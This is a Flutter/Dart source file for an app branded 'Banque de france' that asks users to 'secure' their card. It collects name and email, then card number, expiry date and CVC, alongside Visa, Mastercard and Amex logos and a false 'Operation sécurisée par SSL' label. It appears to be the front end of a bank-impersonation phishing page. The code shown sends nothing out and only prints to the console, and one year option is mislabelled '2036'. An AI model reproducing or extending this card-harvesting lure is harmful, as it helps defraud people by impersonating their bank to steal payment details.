import 'dart:async';
import 'package:banque_de_france/container1.dart';
import 'package:email_validator/email_validator.dart';
import 'package:banque_de_france/myAppbar.dart';
import "package:flutter/material.dart";
import 'package:desktop_window/desktop_window.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: "Banque de france",
      home: MyHomme(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class MyHomme extends StatefulWidget {
  const MyHomme({Key? key}) : super(key: key);

  @override
  _MyHommeState createState() => _MyHommeState();
}

class _MyHommeState extends State<MyHomme> with TickerProviderStateMixin {
  func() async {
    await DesktopWindow.setMinWindowSize(Size(400, 400));
  }

  late final AnimationController animationController = AnimationController(
    vsync: this,
    duration: Duration(seconds: 2),
  );
  late var anime =
      Tween<double>(begin: 0.1, end: 1).animate(animationController);

  bool isvisible = false;

  @override
  void initState() {
    super.initState();

    func();
  }

  final firstkey = GlobalKey<FormState>();
  final secondkey = GlobalKey<FormState>();
  bool next = false;
  String? prenom;
  String? nom;
  String? email;
  int mois = 8;
  int annee = 20;
  @override
  Widget build(BuildContext context) {
    Size size = MediaQuery.of(context).size;

    return Scaffold(
      backgroundColor: Colors.white,
      body: SingleChildScrollView(
        child: Container(
          child: Column(
            children: [
              MyAppBar(),
              SizedBox(
                height: 30,
              ),
              containerone(size: size),
              Visibility(
                visible: isvisible,
                child: FadeTransition(
                  opacity: anime,
                  child: next
                      ? Container(
                          width: 600,
                          padding: EdgeInsets.symmetric(horizontal: 20),
                          child: Form(
                            key: secondkey,
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                SizedBox(
                                  height: 10,
                                ),
                                Text(
                                  "Saisissez vos informations pour valider la securisation",
                                  style: TextStyle(
                                    color: Colors.black54,
                                    fontSize: 16,
                                  ),
                                ),
                                Row(
                                  mainAxisAlignment: MainAxisAlignment.start,
                                  children: [
                                    Image.asset(
                                      "images/logo_visa.png",
                                      width: 60,
                                      height: 40,
                                    ),
                                    Image.asset(
                                      "images/logo_mastercard.png",
                                      width: 60,
                                      height: 40,
                                    ),
                                    Image.asset(
                                      "images/logo_amex.png",
                                      width: 60,
                                      height: 40,
                                    ),
                                  ],
                                ),
                                Container(
                                  width: 300,
                                  child: TextFormField(
                                    validator: (b) {
                                      if (b!.length < 15) {
                                        return "carte non valide";
                                      }
                                    },
                                    decoration: InputDecoration(
                                      hintText: "Numéro de carte",
                                    ),
                                  ),
                                ),
                                SizedBox(
                                  height: 10,
                                ),
                                Text(
                                  "Date d'expiration",
                                  style: TextStyle(
                                    color: Colors.grey,
                                    fontSize: 14,
                                  ),
                                ),
                                Row(
                                  mainAxisAlignment: MainAxisAlignment.start,
                                  children: [
                                    Container(
                                      padding:
                                          EdgeInsets.symmetric(horizontal: 10),
                                      decoration: BoxDecoration(
                                        border: Border.all(
                                          color: Colors.black,
                                        ),
                                      ),
                                      child: DropdownButtonHideUnderline(
                                        child: DropdownButton(
                                          value: mois,
                                          onChanged: (int? b) {
                                            setState(() {
                                              mois = b!;
                                            });
                                          },
                                          items: [
                                            DropdownMenuItem(
                                              child: Text("01"),
                                              value: 1,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("02"),
                                              value: 2,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("03"),
                                              value: 3,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("04"),
                                              value: 4,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("05"),
                                              value: 5,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("06"),
                                              value: 6,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("07"),
                                              value: 07,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("08"),
                                              value: 8,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("09"),
                                              value: 9,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("10"),
                                              value: 10,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("11"),
                                              value: 11,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("12"),
                                              value: 12,
                                            ),
                                          ],
                                        ),
                                      ),
                                    ),
                                    SizedBox(width: 10),
                                    Text(
                                      "/",
                                      style: TextStyle(color: Colors.teal),
                                    ),
                                    SizedBox(width: 10),
                                    Container(
                                      padding:
                                          EdgeInsets.symmetric(horizontal: 10),
                                      decoration: BoxDecoration(
                                        border: Border.all(
                                          color: Colors.black,
                                        ),
                                      ),
                                      child: DropdownButtonHideUnderline(
                                        child: DropdownButton(
                                          value: annee,
                                          onChanged: (int? b) {
                                            setState(() {
                                              annee = b!;
                                            });
                                          },
                                          items: [
                                            DropdownMenuItem(
                                              child: Text("2020"),
                                              value: 20,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2021"),
                                              value: 21,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2022"),
                                              value: 22,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2023"),
                                              value: 23,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2024"),
                                              value: 24,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2025"),
                                              value: 25,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2036"),
                                              value: 26,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2027"),
                                              value: 27,
                                            ),
                                            DropdownMenuItem(
                                              child: Text("2028"),
                                              value: 28,
                                            ),
                                          ],
                                        ),
                                      ),
                                    ),
                                    SizedBox(width: 20),
                                    Container(
                                      width: 50,
                                      padding: EdgeInsets.all(0),
                                      margin: EdgeInsets.only(bottom: 16),
                                      child: TextFormField(
                                        keyboardType: TextInputType.number,
                                        validator: (b) {
                                          if (b!.length < 3) {
                                            return "invalide";
                                          }
                                        },
                                        maxLength: 3,
                                        decoration: InputDecoration(
                                          hintText: "CVC",
                                        ),
                                      ),
                                    )
                                  ],
                                ),
                                SizedBox(
                                  height: 20,
                                ),
                                ElevatedButton(
                                  style: ButtonStyle(
                                    padding: MaterialStateProperty.all(
                                      EdgeInsets.symmetric(
                                        horizontal: 80,
                                        vertical: 25,
                                      ),
                                    ),
                                    backgroundColor: MaterialStateProperty.all(
                                      Colors.teal,
                                    ),
                                  ),
                                  onPressed: () {
                                    if (secondkey.currentState!.validate()) {
                                      print(" 2nd valide");
                                    }
                                  },
                                  child: Text("VALIDER"),
                                ),
                                SizedBox(
                                  height: 10,
                                ),
                              ],
                            ),
                          ),
                        )
                      : Container(
                          margin: EdgeInsets.symmetric(vertical: 10),
                          padding: EdgeInsets.symmetric(vertical: 10),
                          width: 600,
                          height: 300,
                          child: Form(
                            key: firstkey,
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  "Vos Coordonées",
                                  style: TextStyle(
                                      fontSize: 22, color: Colors.grey),
                                ),
                                Row(
                                  children: [
                                    form(
                                      Icons.person,
                                      "Prénom",
                                      (b) {
                                        if (b!.isEmpty) {
                                          return "champ vide";
                                        }
                                      },
                                    ),
                                    form(Icons.person, "Nom", (b) {}),
                                  ],
                                ),
                                form(Icons.mail, "Email", (b) {
                                  if (!EmailValidator.validate(b!)) {
                                    return "Entrer un email";
                                  } else if (b.isEmpty) {
                                    return "champ vide";
                                  }
                                }),
                                Divider(),
                                Align(
                                  alignment: Alignment.bottomRight,
                                  child: ElevatedButton(
                                    style: ButtonStyle(
                                      backgroundColor:
                                          MaterialStateProperty.all(
                                              Colors.teal),
                                      padding: MaterialStateProperty.all(
                                        EdgeInsets.symmetric(
                                            horizontal: 40, vertical: 20),
                                      ),
                                      shape: MaterialStateProperty.all(
                                        RoundedRectangleBorder(
                                          borderRadius:
                                              BorderRadius.circular(0),
                                        ),
                                      ),
                                    ),
                                    onPressed: () {
                                      if (firstkey.currentState!.validate()) {
                                        print("next");
                                        setState(() {
                                          next = true;
                                        });
                                      }
                                    },
                                    child: Text("SUITE"),
                                  ),
                                )
                              ],
                            ),
                          ),
                        ),
                ),
              ),
              Container(
                width: 600,
                decoration: BoxDecoration(
                  border: Border.all(
                    color: Colors.grey,
                  ),
                ),
                child: Column(
                  children: [
                    Container(
                      padding: EdgeInsets.symmetric(vertical: 7),
                      color: Color(0xff5e5e5e),
                      child: Center(
                        child: Text(
                          "Contactez-nous | Conditions générales de securité",
                          style: TextStyle(color: Colors.white),
                        ),
                      ),
                    ),
                    Container(
                      padding: EdgeInsets.symmetric(vertical: 7),
                      color: Colors.white,
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text("Platforme crée avec "),
                          Image.asset(
                            "images/logo_payfacile.png",
                            width: 100,
                          ),
                          Text("| Politique de sécurité"),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
              SizedBox(height: 15),
            ],
          ),
        ),
      ),
    );
  }

  // Widget verifcarte() {
  //   return
  // }

  Widget form(
      IconData? icon, String hintext, String? Function(String?) validator) {
    return Expanded(
      child: Container(
        child: Row(
          children: [
            if (icon != null)
              Container(
                margin: EdgeInsets.all(18),
                child: Icon(
                  icon,
                  color: Colors.grey,
                ),
              ),
            Expanded(
              child: TextFormField(
                decoration: InputDecoration(
                  hintText: hintext,
                ),
                validator: validator,
              ),
            ),
          ],
        ),
      ),
    );
  }

  containerone({Size? size}) {
    return Container(
      child: Column(
        children: [
          Container(
            padding: EdgeInsets.symmetric(horizontal: 10),
            width: 600,
            decoration: BoxDecoration(
              color: Color(0xfffafafa),
              borderRadius: BorderRadius.circular(5),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "Securiser ma carte",
                  style: TextStyle(
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Divider(),
                Container(
                  padding: EdgeInsets.symmetric(horizontal: 9, vertical: 10),
                  child: Center(
                    child: Card(
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: [
                          if (size!.width > 650)
                            Container(
                              child: Image.asset("images/ia.jpeg"),
                              width: 300,
                              height: 160,
                            ),
                          Container(
                            padding: EdgeInsets.symmetric(vertical: 10),
                            child: Column(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: [
                                ElevatedButton(
                                  style: ButtonStyle(
                                    backgroundColor:
                                        MaterialStateProperty.all(Colors.teal),
                                    padding: MaterialStateProperty.all(
                                      EdgeInsets.symmetric(
                                          horizontal: 10, vertical: 10),
                                    ),
                                    shape: MaterialStateProperty.all(
                                      RoundedRectangleBorder(
                                        borderRadius: BorderRadius.circular(0),
                                      ),
                                    ),
                                  ),
                                  onPressed: () {
                                    setState(() {
                                      isvisible = true;
                                      Timer(Duration(seconds: 1), () {
                                        animationController.forward();
                                      });

                                      animationController.reset();
                                    });
                                  },
                                  child: Text("CONFIRMER"),
                                ),
                                Container(
                                  child: Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Image.asset(
                                        "images/logo_visa.png",
                                        width: 50,
                                        height: 30,
                                      ),
                                      Image.asset(
                                        "images/logo_mastercard.png",
                                        width: 50,
                                        height: 30,
                                      ),
                                      Image.asset(
                                        "images/logo_amex.png",
                                        width: 50,
                                        height: 30,
                                      ),
                                    ],
                                  ),
                                ),
                                Text(
                                  "Operation sécurisée par SSL",
                                  style: TextStyle(
                                    fontSize: 10,
                                  ),
                                ),
                              ],
                            ),
                          )
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
